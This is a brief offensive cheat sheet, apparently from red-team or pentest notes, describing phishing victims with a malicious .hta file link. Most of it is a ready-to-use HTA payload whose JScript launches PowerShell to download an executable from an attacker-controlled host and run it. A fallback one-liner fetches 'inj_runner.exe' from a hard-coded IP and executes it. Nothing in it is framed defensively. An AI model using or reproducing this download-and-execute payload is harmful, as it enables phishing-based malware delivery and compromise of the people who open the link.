## Phishing via .hta files

- if Office does not appear to be working for you, can try sending an email with a malicious .hta file link.

### PowerShell Download Cradle

```html
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("powershell iwr -uri http://IP:PORT/file.exe -outfile
C:\\path\\to\\file.exe;C:\\path\\to\\file.exe");
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>

```
if the above doesnt work try
```
var ress = shell.Run("powershell.exe wget http://172.21.23.10/inj_runner.exe -o C:\\users\\public\\runner.exe; C:\\users\\public\\runner.exe");
```
